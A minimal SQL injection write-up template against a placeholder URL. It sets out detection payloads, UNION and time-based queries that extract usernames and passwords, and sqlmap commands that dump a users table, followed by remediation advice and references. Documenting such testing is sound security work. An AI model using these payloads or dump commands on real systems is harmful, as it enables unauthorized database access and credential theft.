# Sample SQLi Writeup (minimal)

## Target
- URL: http://example.com/product?id=1
- Parameter: `id` (GET)

## Summary
The `id` parameter is vulnerable to SQL injection. Exploited using boolean- and UNION-based techniques to extract table names and user data.

## Discovery / Detection
1. Sent a request with `id=1'` and observed an SQL error indicating unescaped input.

Request (shortened):
GET /product?id=1' HTTP/1.1

Response contained: "SQL syntax error near '...'"

2. Confirmed with boolean payload that changes page content:

- `id=1 AND 1=1` — page loads normally
- `id=1 AND 1=2` — page shows different content or returns empty => boolean-based injection

## Exploitation
1. Find number of columns with UNION:

- `id=1 UNION SELECT NULL--`
- `id=1 UNION SELECT NULL,NULL--`
- Repeat until no error — e.g., `UNION SELECT NULL,NULL,NULL--`

2. Identify readable columns and craft `UNION SELECT` to extract varchar columns:

`id=1 UNION SELECT NULL,username,password FROM users--`

3. If UNION blocked or no visible output, use time-based to extract slowly (example MySQL):

`id=1 OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--`

## Using sqlmap (example)

- Basic DB enumeration:

```bash
sqlmap -u "http://example.com/product?id=1" --dbs --batch
```

- Dump `users` table from `appdb`:

```bash
sqlmap -u "http://example.com/product?id=1" -D appdb -T users --dump --batch
```

## Evidence
- Paste response snippets and/or screenshots here. Keep copies of HTTP requests/responses.

## Remediation
- Use prepared statements / parameterized queries
- Use least privilege for DB accounts
- Normalize error messages (do not reveal DB errors)

## References
- PortSwigger Academy: SQL injection labs
- OWASP: SQL Injection Prevention Cheat Sheet
